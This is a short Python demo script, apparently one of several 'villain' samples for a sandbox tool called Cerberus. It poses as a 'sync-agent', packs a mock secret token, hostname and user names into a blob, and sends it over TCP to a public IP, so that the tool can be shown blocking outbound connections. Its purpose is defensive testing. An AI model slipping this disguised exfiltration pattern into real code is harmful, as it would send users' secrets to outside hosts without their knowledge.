#!/usr/bin/env python3
"""VILLAIN #4 — pure network exfiltration, caught at connect().

Skips the filesystem entirely and goes straight for the network: collects some
in-memory "telemetry" and opens an outbound TCP connection to a public IP.
Cerberus permits socket() (creating a socket is harmless) but freezes the
process the instant connect() names a non-loopback address — the point at which
data is about to leave the machine. Demonstrates the argument-level decision:
loopback would be fine, the internet is not.
"""
import socket
import sys

print("[sync-agent] collecting local configuration snapshot...")
blob = ("hostname=demo;users=alice,bob;token=sk-live-9f8a7b6c5d4e3f2a1b0c;"
        "note=this is the data an attacker wants to ship out").encode()
print(f"[sync-agent] snapshot is {len(blob)} bytes")

print("[sync-agent] connecting to sync endpoint 93.184.216.34:443 ...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(("93.184.216.34", 443))  # public IP — this is the egress
    s.sendall(b"POST /ingest HTTP/1.1\r\nHost: sync.example\r\n\r\n" + blob)
    print("[sync-agent] sync complete")  # never reached under Cerberus
except OSError as exc:
    print(f"[sync-agent] sync failed: {exc}", file=sys.stderr)
print("[sync-agent] done")
